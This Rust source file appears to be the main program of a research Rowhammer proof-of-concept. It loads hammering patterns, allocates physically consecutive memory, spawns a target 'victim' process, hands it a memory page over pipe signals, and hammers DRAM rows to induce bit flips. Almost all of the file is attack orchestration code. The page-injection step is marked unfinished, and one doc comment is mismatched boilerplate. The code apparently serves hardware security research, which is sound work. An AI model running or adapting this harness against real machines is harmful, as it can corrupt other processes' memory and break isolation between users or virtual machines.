use std::{
    env,
    fmt::Debug,
    fs::File,
    io::{stdin, BufRead, BufReader},
    process::{Child, ChildStdin, ChildStdout, Command},
    thread::{self, sleep},
    time::Duration,
};

use anyhow::{bail, Context};
use bs_poc::{
    forge::{
        FuzzSummary, HammerResult, Hammerer, Hammering, HammeringPattern, PatternAddressMapper,
    },
    jitter::AggressorPtr,
    memory::{
        compact_mem, construct_memory_tuple_timer, AllocChecker, ConsecAllocBuddyInfo,
        ConsecAllocCoCo, ConsecAllocHugepageRnd, ConsecAllocMmap, ConsecAllocator, ConsecBlocks,
        ConsecCheckBankTiming, ConsecCheckPfn, HugepageAllocator, MemBlock, PfnResolver,
    },
    retry,
    util::{
        make_vec, BlacksmithConfig, MemConfiguration, PipeIPC, ATTACKER_READY, IPC, MB, PAGE_SIZE,
        VICTIM_ALLOC_DONE, VICTIM_ALLOC_READY,
    },
    victim::{HammerVictim, HammerVictimMemCheck},
};
use clap::Parser;
use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use indicatif_log_bridge::LogWrapper;
use log::{info, warn};

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The BlacksmithConfig
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
    #[clap(long = "mapping")]
    mapping: Option<String>,
    #[clap(long = "consec-check", default_value = "bank-timing")]
    consec_check: ConsecCheckType,
    #[clap(long = "alloc-strategy", default_value = "mmap")]
    alloc_strategy: ConsecAllocType,
    /// The target to hammer
    target: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecCheckType {
    Pfn,
    BankTiming,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecAllocType {
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    Hugepage,
    HugepageRnd,
    Mmap,
}

fn _prog() -> Option<String> {
    env::args().next().as_ref().cloned()
}

/// Send a signal `sig` to the process `pid`
fn _signal(sig: &str, pid: u32) -> anyhow::Result<()> {
    let mut kill = Command::new("kill")
        .args(["-s", sig, &pid.to_string()])
        .spawn()?;
    kill.wait()?;
    Ok(())
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(&option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

/**
 * A helper enum to create a checker from CLI arguments. This allows us to circumvent heap allocation
 */
enum ConsecCheck {
    Pfn(ConsecCheckPfn),
    BankTiming(ConsecCheckBankTiming),
}

impl AllocChecker for ConsecCheck {
    fn check(&mut self, block: &MemBlock) -> anyhow::Result<bool> {
        match self {
            ConsecCheck::Pfn(c) => c.check(block),
            ConsecCheck::BankTiming(c) => c.check(block),
        }
    }
}

fn create_consec_checker_from_cli(
    consec_check: ConsecCheckType,
    mem_config: MemConfiguration,
    conflict_threshold: u64,
    progress: Option<MultiProgress>,
) -> anyhow::Result<ConsecCheck> {
    Ok(match consec_check {
        ConsecCheckType::Pfn => ConsecCheck::Pfn(ConsecCheckPfn {}),
        ConsecCheckType::BankTiming => {
            ConsecCheck::BankTiming(ConsecCheckBankTiming::new_with_progress(
                mem_config,
                construct_memory_tuple_timer()?,
                conflict_threshold,
                progress,
            ))
        }
    })
}

/**
 * A helper enum to create an allocator from CLI arguments. This allows us to circumvent heap allocation
 */
enum ConsecAlloc {
    BuddyInfo(ConsecAllocBuddyInfo),
    CoCo(ConsecAllocCoCo),
    Hugepage(HugepageAllocator),
    HugepageRnd(ConsecAllocHugepageRnd),
    Mmap(ConsecAllocMmap),
}

impl ConsecAllocator for ConsecAlloc {
    fn block_size(&self) -> usize {
        match self {
            ConsecAlloc::BuddyInfo(alloc) => alloc.block_size(),
            ConsecAlloc::CoCo(alloc) => alloc.block_size(),
            ConsecAlloc::Hugepage(alloc) => alloc.block_size(),
            ConsecAlloc::HugepageRnd(alloc) => alloc.block_size(),
            ConsecAlloc::Mmap(alloc) => alloc.block_size(),
        }
    }

    unsafe fn alloc_consec_blocks(
        &mut self,
        size: usize,
        progress_cb: impl Fn(),
    ) -> anyhow::Result<bs_poc::memory::ConsecBlocks> {
        match self {
            ConsecAlloc::BuddyInfo(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
            ConsecAlloc::CoCo(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
            ConsecAlloc::Hugepage(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
            ConsecAlloc::HugepageRnd(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
            ConsecAlloc::Mmap(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
        }
    }
}

fn create_allocator_from_cli(
    alloc_strategy: ConsecAllocType,
    consec_checker: Box<dyn AllocChecker>,
) -> ConsecAlloc {
    match alloc_strategy {
        ConsecAllocType::BuddyInfo => {
            ConsecAlloc::BuddyInfo(ConsecAllocBuddyInfo::new(consec_checker))
        }
        ConsecAllocType::CoCo => ConsecAlloc::CoCo(ConsecAllocCoCo {}),
        ConsecAllocType::Mmap => ConsecAlloc::Mmap(ConsecAllocMmap::new(consec_checker)),
        ConsecAllocType::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::new()),
        ConsecAllocType::HugepageRnd => {
            let hugepages = make_vec(10, |_| unsafe {
                HugepageAllocator::new()
                    .alloc_consec_blocks(1024 * MB, || {})
                    .expect("hugepage alloc")
            });
            ConsecAlloc::HugepageRnd(ConsecAllocHugepageRnd::new(hugepages))
        }
    }
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    info!("Flips in mapping: {:?}", &mapping.bit_flips);
    Ok(LoadedPattern { pattern, mapping })
}

unsafe fn alloc_memory(
    mem_config: MemConfiguration,
    threshold: u64,
    mut alloc_strategy: ConsecAlloc,
    mapping: &PatternAddressMapper,
    progress: &MultiProgress,
) -> anyhow::Result<ConsecBlocks> {
    let block_size = alloc_strategy.block_size();
    let block_shift = block_size.ilog2() as usize;
    let num_sets = mapping.aggressor_sets(mem_config, block_shift).len();
    let num_blocks = num_sets * block_size;

    let pg = ProgressBar::new(num_blocks as u64).with_style(
        ProgressStyle::with_template(
            "Blocks: [{elapsed_precise} ({eta} remaining)] {bar:40.cyan/blue} {pos:>7}/{len:7}",
        )
        .unwrap(),
    );
    let pg = progress.add(pg);
    pg.enable_steady_tick(Duration::from_secs(1));

    pg.set_length(num_sets as u64);
    compact_mem()?;
    pg.set_position(0);
    let memory = alloc_strategy.alloc_consec_blocks(num_sets * block_size, || pg.inc(1))?;
    let memory = memory.pfn_align(&mem_config, threshold, &*construct_memory_tuple_timer()?)?;
    memory.log_pfns()?;
    pg.finish_and_clear();
    Ok(memory)
}

fn hammer(
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
    mem_config: MemConfiguration,
    block_size: usize,
    memory: ConsecBlocks,
) -> anyhow::Result<HammerResult> {
    let block_shift = block_size.ilog2();
    let hammering_addrs = mapping.get_hammering_addresses_relocate(
        &pattern.access_ids,
        mem_config,
        block_shift as usize,
        &memory.blocks,
    )?;

    let hammerer = Hammerer::new(
        mem_config,
        pattern.clone(),
        mapping.clone(),
        &hammering_addrs,
        &memory.blocks,
    )?;
    //let hammerer = DummyHammerer::new(&memory, 17);
    let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);

    info!("Hammering pattern. This might take a while...");
    let res = hammerer.hammer(&mut victim, 3);
    match &res {
        Ok(res) => {
            info!("{:?}", res);
            victim.log_report(0 as AggressorPtr);
        }
        Err(e) => {
            warn!("Hammering not successful: {:?}", e);
        }
    }
    memory.dealloc();
    res
}

/// spawn a thread to log the victim's stderr
fn log_victim_stderr(victim: &mut Option<Child>) -> anyhow::Result<()> {
    if let Some(victim) = victim {
        let stderr = victim.stderr.take().context("victim stderr")?;
        thread::spawn(move || {
            let reader = BufReader::new(stderr);
            for line in reader.lines() {
                info!(target: "victim", "{}", line.unwrap());
            }
        });
    }
    Ok(())
}

fn spawn_victim(victim: &[String]) -> anyhow::Result<Option<Child>, std::io::Error> {
    let mut victim_args = victim.to_vec();
    let victim = victim_args.pop();
    victim
        .map(|victim| {
            Command::new(victim)
                .args(victim_args)
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
        })
        .transpose()
}

fn inject_page(victim: &mut Option<Child>) -> anyhow::Result<()> {
    match victim {
        Some(victim) => {
            let mut channel = piped_channel(victim)?;
            // signal victim
            sleep(Duration::from_secs(1));
            channel.send(ATTACKER_READY)?;

            let b = MemBlock::mmap(PAGE_SIZE)?;
            let pfn = b.pfn()?;
            info!("Victim block PFN: 0x{:02x}", pfn);

            info!("Waiting for signal {}", VICTIM_ALLOC_READY);
            channel.wait_for(VICTIM_ALLOC_READY)?;
            info!("Received signal {}", VICTIM_ALLOC_READY);

            b.dealloc();
            warn!("TODO release victim page (determined by mapping)");

            info!("Waiting for signal {}", VICTIM_ALLOC_DONE);
            channel.wait_for(VICTIM_ALLOC_DONE)?;
            info!("Received signal {}", VICTIM_ALLOC_DONE);
            channel.close()?;
        }
        None => info!("No target specified, skipping IPC."),
    }
    Ok(())
}

fn piped_channel(child: &mut Child) -> anyhow::Result<PipeIPC<ChildStdout, ChildStdin>> {
    let child_in = child.stdin.take().context("stdin")?;
    let child_out = child.stdout.take().context("stdout")?;
    Ok(PipeIPC::new(child_out, child_in))
}

fn init_logging_with_progress() -> anyhow::Result<MultiProgress> {
    let logger =
        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).build();
    let progress = MultiProgress::new();
    LogWrapper::new(progress.clone(), logger).try_init()?;
    Ok(progress)
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();
    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    let consec_checker = create_consec_checker_from_cli(
        args.consec_check,
        mem_config,
        config.threshold,
        Some(progress.clone()),
    )?;
    let alloc_strategy = create_allocator_from_cli(args.alloc_strategy, Box::new(consec_checker));
    let block_size = alloc_strategy.block_size();

    let mut victim = spawn_victim(&args.target)?;
    log_victim_stderr(&mut victim)?;
    info!("Launch bait allocation");

    let memory = alloc_memory(
        mem_config,
        config.threshold,
        alloc_strategy,
        &pattern.mapping,
        &progress,
    )?;

    inject_page(&mut victim)?;

    let result = hammer(
        pattern.pattern,
        pattern.mapping,
        mem_config,
        block_size,
        memory,
    )?;
    info!("Hammering result: {:?}", result);

    if let Some(victim) = victim {
        info!("Waiting for victim to finish");
        let output = victim.wait_with_output()?;
        info!("Captured output: {:?}", output);
    }
    info!("Goodbye.");

    Ok(())
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
